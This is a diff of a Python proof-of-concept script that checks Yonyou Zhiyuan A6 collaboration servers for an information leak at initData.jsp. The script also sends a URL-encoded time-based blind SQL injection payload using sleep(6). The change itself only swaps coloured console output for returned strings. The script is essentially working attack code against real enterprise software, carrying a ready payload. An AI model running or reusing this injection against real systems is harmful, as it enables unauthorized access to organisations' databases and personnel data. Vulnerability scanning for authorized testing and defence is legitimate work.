@@ -9,8 +9,8 @@ description: 用友致远A6 /yyoa/common/selectPersonNew/initData.jsp?trueName=1
 import sys
 import time
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class yonyou_initData_disclosure_BaseVerify:
     def __init__(self, url):
@@ -25,18 +25,18 @@ class yonyou_initData_disclosure_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"personList" in req.text and r"new Person" in req.text:
-                cprint("[+]存在用友致远A6协同系统敏感信息泄露漏洞...(敏感信息)\tpayload: "+vulnurl, "green")
+                return "[+]存在用友致远A6协同系统敏感信息泄露漏洞...(敏感信息)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/yyoa/common/selectPersonNew/initData.jsp?trueName=1%25%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28sleep%286%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29>64%20AND%20%27%25%27%3D%27"
             start_time = time.time()
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if time.time() - start_time >= 6:
-                cprint("[+]存在用友致远A6协同系统SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在用友致远A6协同系统SQL注入漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = yonyou_initData_disclosure_BaseVerify(sys.argv[1])
     testVuln.run()
